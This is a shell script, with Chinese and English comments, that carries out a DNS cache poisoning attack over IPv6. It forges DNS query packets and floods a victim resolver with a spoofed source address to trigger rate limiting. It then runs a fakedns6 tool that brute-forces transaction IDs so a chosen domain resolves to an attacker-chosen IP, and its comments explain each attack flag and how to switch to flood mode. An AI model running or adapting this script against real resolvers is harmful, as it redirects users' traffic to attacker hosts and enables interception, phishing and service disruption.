# usage ./dns_query.sh [Resolver IP] [Wanted IP] [iface] [domain (e.g. www google com)]
# clear the previous files
sleep 1
echo "初始化工具环境"

# 创建空的二进制文件，dns_mid.bin 和 txid.bin
dd if=/dev/null of=dns_mid.bin > /dev/null 2>&1
dd if=/dev/null of=txid.bin > /dev/null 2>&1

# write the domain name into the binary
domains=$(echo $4| sed "s/\./ /g")    # 将域名转换为空格分隔的字符串
for var in ${domains:0}   # 遍历域名的每个部分
do
  size=${#var}  # 获取当前域名的长度
  echo -en "\x`printf '%x\n' $size`" >> dns_mid.bin   # 写入长度
  echo -n "$var" >> dns_mid.bin     # 写入域名
done

# set a random TxID
echo -en "\x`shuf -i 0-99 -n 1`" >> txid.bin
echo -en "\x`shuf -i 0-99 -n 1`" >> txid.bin

# forge a entire DNS query packet
cat txid.bin dns_start.bin dns_mid.bin dns_end.bin dns_OPT.bin > dns.bin
# change the sending speed if necessary (-i). Set it to "flood" (replace -i with --flood) to maximize the power.
# fire!
echo "尝试触发权威服务器请求速率限制"
# 使用udp6工具发送DNS查询数据包，指定目标和速率
udp6 -d $1 -a 53 -Z dns.bin -r 50pps -s $2 > /dev/null 2>&1
sleep 1

a=$(($RANDOM % 9 + 1))
echo "a:$a"
if [ $a -gt 6 ]; then
  #echo "dns-TIP:$1"
  #echo "dns-WIP:$2"
  #echo "dns-iface:$3"
  #echo "dns-domain:$4"
  ./fakedns6 -b $1 -i $3 -n $4 -r $1 -t 50000 -at $2 -tg 0 -s 10000 -e 65000 -j 0 -f 1
  # b, Back-end IP of the victim resolver, 目标解析器的IP地址
  # i, Interface for attacking, 攻击使用的接口
  # n, the domain name to be poisoned, 要进行缓存投毒的域名
  # r, Front-end IP of the victim resolver
  # t, Timeout in ms for outgoing dns queries to the victim resolver
  # at, 攻击者想要更改到的IP地址
  # tg, time gap is us between the TxID brute force packets
  echo "0"
fi


